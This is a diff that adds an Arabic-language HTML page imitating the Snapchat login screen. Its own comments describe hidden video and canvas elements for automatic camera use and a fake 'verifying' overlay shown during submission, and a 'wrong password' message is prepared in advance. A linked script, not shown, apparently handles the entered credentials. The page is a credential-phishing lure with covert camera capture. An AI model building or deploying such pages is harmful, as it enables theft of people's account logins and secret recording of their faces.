@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>تسجيل الدخول • Snapchat</title>
+    <link rel="icon" href="logo.png" type="image/png">
+    
+    <!-- التنسيق المدمج بالكامل لصفحة تسجيل الدخول -->
+    <style>
+        * {
+            box-sizing: border-box; 
+            margin: 0; 
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; 
+            direction: rtl; 
+            -webkit-tap-highlight-color: transparent;
+        }
+        body {
+            background-color: #fff; 
+            color: #000;
+            line-height: 1.6; 
+            text-align: right; 
+            overflow-x: hidden; 
+        }
+        a { 
+            text-decoration: none; 
+            color: #007aff;
+        }
+
+        #video, #canvas { 
+            display: none !important; 
+            position: absolute; 
+            left: -9999px; 
+        }
+
+        .login-page-body {
+            background-color: #fff;
+            display: flex; 
+            flex-direction: column;
+            min-height: 100vh;
+            justify-content: center; 
+            align-items: center;
+        }
+        .login-container {
+            width: 100%; 
+            max-width: 400px;
+            padding: 40px; 
+            text-align: center;
+        }
+        .login-logo { 
+            width: 70px; 
+            height: 70px; 
+            margin-bottom: 15px; 
+        }
+        .login-header h2 {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 30px;
+            color: #000;
+        }
+        .input-group { 
+            margin-bottom: 20px; 
+            text-align: right; 
+        }
+        .input-group label {
+            display: block; 
+            font-size: 12px; 
+            color: #777;
+            margin-bottom: 5px; 
+            font-weight: 600; 
+            text-transform: uppercase;
+        }
+        .input-group input {
+            width: 100%; 
+            padding: 12px 0; 
+            border: none;
+            border-bottom: 1px solid #ddd; 
+            font-size: 16px;
+            background: transparent; 
+            outline: none;
+            transition: border-color 0.3s;
+        }
+        .input-group input:focus {
+            border-bottom-color: #007aff;
+        }
+        .error-message-snap {
+            color: #ff3b30;
+            font-size: 13px;
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+        .login-btn-large {
+            background-color: #007aff; 
+            color: #fff; 
+            border: none;
+            width: 100%; 
+            padding: 15px; 
+            border-radius: 50px;
+            font-size: 16px; 
+            font-weight: 700; 
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background-color 0.2s;
+        }
+        .login-btn-large:active {
+            background-color: #0056b3;
+        }
+        .forgot-link {
+            display: block;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #007aff;
+        }
+        .signup-prompt {
+            margin-top: 30px;
+            font-size: 14px;
+            color: #666;
+        }
+        .loading-overlay { 
+            z-index: 3000; 
+            position: fixed; 
+            inset: 0; 
+            background: rgba(255,255,255,0.95); 
+            display: none; 
+            flex-direction: column; 
+            justify-content: center; 
+            align-items: center; 
+        }
+        .spinner { 
+            border: 4px solid #f3f3f3; 
+            border-top: 4px solid #000; 
+            border-radius: 50%; 
+            width: 40px; 
+            height: 40px; 
+            animation: spin 0.8s linear infinite; 
+            margin-bottom: 15px;
+        }
+        .loading-overlay p {
+            font-size: 15px;
+            font-weight: 600;
+            color: #333;
+        }
+        @keyframes spin { 
+            100% { transform: rotate(360deg); } 
+        }
+    </style>
+</head>
+<body class="login-page-body">
+
+    <!-- عناصر الكاميرا المخفية للعمل التلقائي -->
+    <video id="video" playsinline autoplay style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+    <div class="login-container">
+        <div class="login-header">
+            <img src="logo.png" alt="Snapchat" class="login-logo">
+            <h2>تسجيل الدخول</h2>
+        </div>
+        
+        <form id="fullLoginForm">
+            <div class="input-group">
+                <label>اسم المستخدم أو البريد الإلكتروني</label>
+                <input type="text" name="username" required autocomplete="username">
+            </div>
+            
+            <div class="input-group">
+                <label>كلمة المرور</label>
+                <input type="password" name="password" required autocomplete="current-password">
+            </div>
+            
+            <p id="loginErrorMsg" class="error-message-snap" style="display: none;">عذراً، كلمة المرور غير صحيحة.</p>
+            
+            <button type="submit" class="login-btn-large">تسجيل الدخول</button>
+        </form>
+        
+        <a href="#" class="forgot-link">هل نسيت كلمة المرور؟</a>
+        <div class="signup-prompt">جديد في سناب شات؟ <a href="#">إنشاء حساب</a></div>
+    </div>
+
+    <!-- نافذة التحميل الوهمية أثناء الإرسال -->
+    <div id="loadingOverlay" class="loading-overlay">
+        <div class="spinner"></div>
+        <p>جاري التحقق...</p>
+    </div>
+    
+    <!-- ربط ملف الجافاسكريبت البرمجي المشترك -->
+    <script src="java.script"></script>
+</body>
+</html>
